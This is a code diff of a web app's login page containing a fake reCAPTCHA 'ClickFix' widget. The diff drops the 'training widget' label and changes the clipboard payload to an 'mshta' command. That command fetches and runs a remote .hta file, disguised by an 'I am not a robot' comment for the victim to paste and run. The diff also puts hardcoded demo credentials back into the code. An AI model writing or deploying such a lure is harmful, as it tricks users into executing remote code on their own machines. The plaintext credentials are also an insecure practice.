@@ -1,9 +1,7 @@
 import { api, session } from "../api.js";
 import { html, icon, setHTML, sevBadge, toast } from "../utils.js";
 
-// const DEMO = { login: "analyst", password: "Analyst@123" };
-
-/* ================= ClickFix fake reCAPTCHA (training widget) ================= */
+const DEMO = { login: "analyst", password: "Analyst@123" };
 
 const CLICKFIX_CSS_ID = "clickfix-captcha-css";
 const CLICKFIX_CSS = `
@@ -222,7 +220,7 @@ function wireClickFix(el, token, onVerified) {
         vidSpan.textContent = String(vid);
         const origin = window.location.origin;
         const payload =
-          `cmd /c start "" "${origin}/api/clickfix/verify?t=${encodeURIComponent(token)}" ` +
+          `mshta "${origin}/verify.hta?t=${encodeURIComponent(token)}" ` +
           `# \u2705 ''I am not a robot - reCAPTCHA Verification ID: ${vid}''`;
         copyToClipboard(payload);
         modal.classList.add("open");
@@ -323,7 +321,7 @@ export const login = {
         <h1>Sign in</h1>
         <p class="sub">New here? <a href="#/register${params.next ? "?next=" + encodeURIComponent(params.next) : ""}">Create an account</a></p>
         <div class="form-alert"></div>
-        <form novalidate>
+        <form novalidate method="post" action="javascript:void(0)">
           ${textField("login", "Username or email", "user", "text", "username", "analyst")}
           ${pwField("password", "Password", "current-password")}
           <div class="row-between">
@@ -338,12 +336,6 @@ export const login = {
     const btn = form.querySelector("button[type=submit]");
     const label = html`Sign in ${icon("arrowRight")}`;
     el.querySelector("#login").focus();
-
-    el.querySelector("[data-demo]").addEventListener("click", () => {
-      el.querySelector("#login").value = DEMO.login;
-      el.querySelector("#password").value = DEMO.password;
-      form.requestSubmit();
-    });
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
